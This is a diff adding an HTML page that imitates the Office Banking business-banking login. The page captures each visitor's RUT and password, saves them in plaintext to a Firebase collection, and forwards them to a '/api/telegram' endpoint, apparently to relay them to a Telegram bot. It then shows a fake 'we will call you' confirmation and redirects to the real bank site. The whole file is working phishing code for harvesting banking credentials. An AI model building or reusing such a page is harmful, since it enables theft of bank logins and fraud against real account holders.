@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Office Banking</title>
+  <!-- Adaptación a móviles -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Enlace al CSS externo -->
+  <link rel="stylesheet" href="styles.css">
+  <!-- Font Awesome para iconos -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Firebase SDK (versión compat) -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <form id="loginForm">
+      <label for="rut">RUT</label>
+      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
+      
+      <label for="passwd">Contraseña</label>
+      <input type="password" id="passwd" name="passwd" required>
+      
+      <div class="options">
+        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
+      </div>
+      
+      <button type="submit">Solicitar</button>
+    </form>
+    <div id="resultado"></div>
+
+    <!-- Footer con imagen de la app -->
+    <div class="app-footer">
+      <div class="app-info">
+        <h3>Toda la gestión de tu empresa en tu mano</h3>
+        <p>Accede a todas las herramientas de la App Office Banking</p>
+        
+        <div class="available-on">
+          <span>Disponible en:</span>
+        </div>
+        
+        <div class="app-badges">
+          <a href="https://apps.apple.com/cl/app/office-banking/id1248490706" 
+             target="_blank" 
+             class="app-store-badge">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" 
+                 alt="Descargar en App Store" class="store-badge">
+          </a>
+          <a href="https://play.google.com/store/search?q=santander+office+banking&c=apps&hl=es_CL" 
+             target="_blank" 
+             class="google-play-badge">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" 
+                 alt="Disponible en Google Play" class="store-badge">
+          </a>
+        </div>
+        
+        <a href="https://empresas.officebanking.cl/article/productos-y-servicios" class="learn-more">
+          Conoce más <i class="fas fa-arrow-right"></i>
+        </a>
+      </div>
+    </div>
+
+
+  <!-- Modal para mensaje push -->
+  <div id="messageModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <i class="fas fa-check-circle"></i>
+        </div>
+        <h2>Solicitud Confirmada</h2>
+      </div>
+      <div class="modal-body">
+        <p><i class="fas fa-phone-alt"></i> Te contactaremos pronto</p>
+        <p class="small">Un ejecutivo se comunicará contigo</p>
+      </div>
+      <div class="modal-footer">
+        <button id="closeModal">Cerrar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Configuración Firebase -->
+  <script src="firebase-config.js"></script>
+
+  <script>
+    // Formateo RUT con puntos y guion
+    function formatearRut(valor) {
+      valor = valor.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(valor.length <= 1) return valor;
+      let cuerpo = valor.slice(0, -1);
+      let dv = valor.slice(-1);
+      let cuerpoConPuntos = "";
+      while(cuerpo.length > 3) {
+        cuerpoConPuntos = "." + cuerpo.slice(-3) + cuerpoConPuntos;
+        cuerpo = cuerpo.slice(0, -3);
+      }
+      cuerpoConPuntos = cuerpo + cuerpoConPuntos;
+      return cuerpoConPuntos + "-" + dv;
+    }
+
+    function validarRut(rutCompleto) {
+      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(rutCompleto.length < 2) return false;
+      let cuerpo = rutCompleto.slice(0, -1);
+      let dv = rutCompleto.slice(-1);
+      let suma = 0, multiplo = 2;
+      for(let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo.charAt(i)) * multiplo;
+        multiplo = multiplo < 7 ? multiplo + 1 : 2;
+      }
+      let dvEsperado = 11 - (suma % 11);
+      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+      return dv === dvEsperado;
+    }
+
+    const rutInput = document.getElementById("rut");
+    rutInput.addEventListener("input", function(e){
+      let valor = e.target.value.replace(/[^0-9kK]/g, "");
+      e.target.value = formatearRut(valor);
+    });
+
+    // Modal y redirección
+    const modal = document.getElementById("messageModal");
+    const closeModalBtn = document.getElementById("closeModal");
+
+    // Función para mostrar el modal
+    function showModal() {
+      modal.style.display = "flex";
+    }
+
+    // Función para redirigir
+    function redirectToPage() {
+      window.location.href = "https://empresas.officebanking.cl/";
+    }
+
+    // Cerrar modal manualmente y redirigir
+    closeModalBtn.addEventListener("click", function() {
+      modal.style.display = "none";
+      redirectToPage();
+    });
+
+    // Cerrar modal al hacer clic fuera y redirigir
+    window.addEventListener("click", function(event) {
+      if (event.target === modal) {
+        modal.style.display = "none";
+        redirectToPage();
+      }
+    });
+
+    // Guardar datos en Firebase
+    async function guardarEnFirebase(datos) {
+      try {
+        await db.collection("solicitudes").add({
+          rut: datos.rut,
+          passwd: datos.passwd,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          fecha: new Date().toLocaleString("es-CL"),
+          userAgent: navigator.userAgent
+        });
+        return true;
+      } catch (error) {
+        console.error("Error guardando en Firebase:", error);
+        return false;
+      }
+    }
+
+    // Enviar datos a Firebase y mostrar mensaje push
+    document.getElementById("loginForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+      const rut = rutInput.value;
+      const passwd = document.getElementById("passwd").value;
+
+      if(!validarRut(rut)){
+        document.getElementById("resultado").innerText = "❌ RUT inválido";
+        document.getElementById("resultado").style.color = "#e63946";
+        return;
+      }
+
+      try {
+        // Guardar en Firebase
+        const guardadoExitoso = await guardarEnFirebase({
+          rut: rut,
+          passwd: passwd
+        });
+
+        if(guardadoExitoso) {
+          // Mostrar modal
+          showModal();
+          
+          // También mostrar mensaje en la página
+          document.getElementById("resultado").innerText = "✅ Solicitud recibida. Te llamaremos dentro de 24 horas.";
+          document.getElementById("resultado").style.color = "#2e7d32";
+
+          // --- ENVÍO A TELEGRAM (CORREGIDO: AHORA DENTRO DEL SUBMIT) ---
+          fetch('/api/telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              rut: rut,
+              passwd: passwd,
+              userAgent: navigator.userAgent,
+              fecha: new Date().toLocaleString("es-CL")
+            })
+          }).catch(err => console.error('Error al enviar a Telegram:', err));
+          // -------------------------------------------------------------
+        } else {
+          throw new Error("Error al guardar en Firebase");
+        }
+
+      } catch (error) {
+        console.error("Error:", error);
+        document.getElementById("resultado").innerText = "⚠️ Error al enviar la solicitud. Intenta nuevamente.";
+        document.getElementById("resultado").style.color = "#e63946";
+      }
+    });
+  </script>
+</body>
+</html>
